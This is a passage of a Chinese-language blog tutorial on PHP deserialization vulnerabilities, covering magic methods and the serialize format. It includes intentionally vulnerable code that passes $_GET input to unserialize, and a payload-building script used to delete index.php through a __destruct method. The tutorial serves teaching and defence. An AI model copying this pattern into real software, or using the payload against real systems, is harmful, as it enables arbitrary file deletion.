    <content type="html"><![CDATA[<h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><p>关于php面向对象编程<br>对象：可以对其做事情的一些东西。一个对象有<strong>状态、行为和标识</strong>三种属性。<br>类：一个共享相同结构和行为的对象的集合。<br>每个类的定义都以关键字class开头，后面跟着类的名字。一个类可以包含有属于自己的变量，变量（称为“属性”）以及函数（“称为方法”）。类定义了一件事物的抽象特点。通常来说，类定义了事物的属性和它可以做到的。类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号“_”开头的，比如<code>_construct</code>,<code>_destruct</code>,<code>_toString</code>,<code>_sleep</code>,<code>_wakeup</code>等。这些函数在某些情况下会自动调用，比如：<code>_construct</code>当一个对象创建时调用（constructor）；<code>_destruct</code>当一个对象被销毁时调用（destructor）；<code>_toString</code>当一个对象被当作一个字符串时使用。</p><h2 id="php对象"><a href="#php对象" class="headerlink" title="php对象"></a>php对象</h2><p>我们先创建一个简单的php对象：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">//一个变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br><span class="hljs-comment">//一个简单的方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable;<br>&#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//调用一个方法</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test.php</span><br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20190323121940213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>接下来开始尝试使用magic函数，在类中添加一个magic函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//一个变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br>    <span class="hljs-comment">//一个简单的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//Constructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//Destructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//call</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;__toString&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-comment">//__construct会被调用</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//创建一个方法</span><br><span class="hljs-comment">//‘This is a string’将会被输出</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-comment">//对象被当作一个字符串</span><br><span class="hljs-comment">//toString会被调用</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$object</span>;<br><span class="hljs-comment">//php脚本要结束时，__destruct会被调用</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test1.php</span><br></code></pre></td></tr></table></figure><p>再来看一下这次：</p><p><img src="https://img-blog.csdnimg.cn/20190323122026327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>从结果看，这几个magic函数依次被调用了，这个旨在帮助我们理解php的magic函数。</p><h2 id="php序列化及格式"><a href="#php序列化及格式" class="headerlink" title="php序列化及格式"></a>php序列化及格式</h2><p>在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。如果一个脚本中想要的调用之前一个脚本的变量，但是之前一个脚本已经执行完毕，所有的变量和内容释放掉了，那该如何操作呢？serialize和unserialize就是解决这一问题的存在，serialize可以将变量转换为字符串，并且在转换的过程中可以保存当前变量的值，而unserialize则可以将serialize生成的字符串转换回变量。通俗来说：通过反序列化在特定条件下可以重建php对象并执行php对象中某些magic函数。我们通过例子来看php对象序列化之后的格式，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//一个类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//类的数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//输出数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printdata</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-comment">//设置数据</span><br><span class="hljs-variable">$usr</span>-&gt;age = <span class="hljs-number">18</span>;<br><span class="hljs-variable">$usr</span>-&gt;name = <span class="hljs-string">&#x27;vergilben&#x27;</span>;<br><span class="hljs-comment">//输出数据</span><br><span class="hljs-variable">$usr</span>-&gt;<span class="hljs-title function_ invoke__">printdata</span>();<br><span class="hljs-comment">//输出序列化后的数据</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$usr</span>)<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test2.php</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20190323122119344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>下面的O:4:“User”:2:{s:3:“age”;i:18;s:4:“name”;s:9:“vergilben”;}就是对象user序列化后的形式，“O”表示对象，“4”表示对象名长度为4，“User”为对象名，“2”表示有2个参数。“{}”里面是参数的key和value，“s”表示string对象，“3”表示长度，“age”则为key；“i”是interger对象，“18”是value，后面的都是相同的道理。接下来我们进行反序列化试一试，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//一个类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//类的数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//输出数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printdata</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//重建对象</span><br><span class="hljs-variable">$usr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:9:&quot;vergilben&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//输出数据</span><br><span class="hljs-variable">$usr</span>-&gt;<span class="hljs-title function_ invoke__">printdata</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test3.php</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190323122157654.png" alt="在这里插入图片描述"> </p><p>可以看到，上次序列化的结果被转变成正常的语句了。</p><h2 id="php对象注入的成因"><a href="#php对象注入的成因" class="headerlink" title="php对象注入的成因"></a>php对象注入的成因</h2><p>我们知道magic函数是php对象的特殊函数，在某些特殊情况下会被调用，这下特殊情况当然包含serialize和unserialize。<br><code>__sleep magic</code>方法在一个对象被序列化时调用，<code>__wakeup magic</code>方法在一个对象被反序列化时调用。下面解释一下： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;BUZZ&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable2</span> = <span class="hljs-string">&#x27;OTHER&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printvariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__wakeup&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__sleep&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;variable&#x27;</span>,<span class="hljs-string">&#x27;variable2&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//创建一个对象，回调用__construct</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-comment">//序列化一个对象，会调用__sleep</span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-comment">//输出序列化后的字符串</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Serialized:&#x27;</span>.<span class="hljs-variable">$serialized</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-comment">//重建对象，会调用__wakeup</span><br><span class="hljs-variable">$object2</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized</span>);<br><span class="hljs-comment">//调用printvariable,会输出数据(BUZZ)</span><br><span class="hljs-variable">$object2</span>-&gt;<span class="hljs-title function_ invoke__">printvariable</span>();<br><span class="hljs-comment">//脚本结束，会调用__destruct</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test4.php</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190323122302544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>可以看到serialize时调用了<code>__sleep</code>，unserialize时调用了<code>__wakeup</code>，在对象被销毁的时候用了<code>__destruce</code>。<br>存在漏洞的思路：一个类用于临时将日志储存进某个文件，当<code>__destruct</code>被调用时，日志文件将会被删除，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//log文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;error.log&#x27;</span>;<br>    <span class="hljs-comment">//一些用于储存日志的代码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$text</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$text</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$text</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctor 删除日志文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct deletes &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;filename.<span class="hljs-string">&#x27;file.&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test5.php</span><br><br><br></code></pre></td></tr></table></figure><p>调用这个类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test5.php&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//类数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//输出数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printdata</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//重建数据</span><br><span class="hljs-variable">$usr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//一个示例代码</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220321204701634.png" alt="image-20220321204701634"> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test5.php&#x27;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">logfile</span>();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test7.php</span><br></code></pre></td></tr></table></figure><p>接下来先进入index.php：</p><p><img src="https://img-blog.csdnimg.cn/20190323122443650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>接下来尝试使用test7.php删除了index.php，进入test7.php:</p><p><img src="https://img-blog.csdnimg.cn/20190323122529281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>现在在目录里已经没有了index.php:</p><p><img src="https://img-blog.csdnimg.cn/20190323122544513.png" alt="在这里插入图片描述"> </p><p>我们再次访问一下test7.php试一试：</p><p><img src="https://img-blog.csdnimg.cn/20190323122559206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>index.php已经没有了。<br>这是一个简单的示例。</p><h2 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h2><p>上一部分展示了由于输入可控造成的<code>__destruct</code>函数删除任意文件，其实问题也可能存在于<code>__wakeup</code>、<code>__sleep</code>、<code>__toString</code>等其他magic函数，一切都取决于程序逻辑。比如，某用户类定义了一个<code>__toString</code>，为了让应用程序能够将类作为一个字符串输出（echo $object），而且其他类也可能定义了一个类允许<code>__toString</code>读取某个文件。</p><h3 id="几个常见的魔术方法"><a href="#几个常见的魔术方法" class="headerlink" title="几个常见的魔术方法"></a>几个常见的魔术方法</h3><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td></tr><tr><td>__destruct</td><td>析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td>__toString</td><td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法</td></tr><tr><td>__wakeup()</td><td>使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td>__sleep()</td><td>使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td>__destruct()</td><td>对象被销毁时触发</td></tr><tr><td>__call()</td><td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td>__set()</td><td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td>__isset()</td><td>当对不可访问属性调用isset()或empty()时触发</td></tr><tr><td>__unset()</td><td>当对不可访问属性调用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><h4 id="几种常见的调用方法"><a href="#几种常见的调用方法" class="headerlink" title="几种常见的调用方法"></a>几种常见的调用方法</h4><h5 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unknown</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;call&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">unknown</span>();<br><br></code></pre></td></tr></table></figure><h5 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span 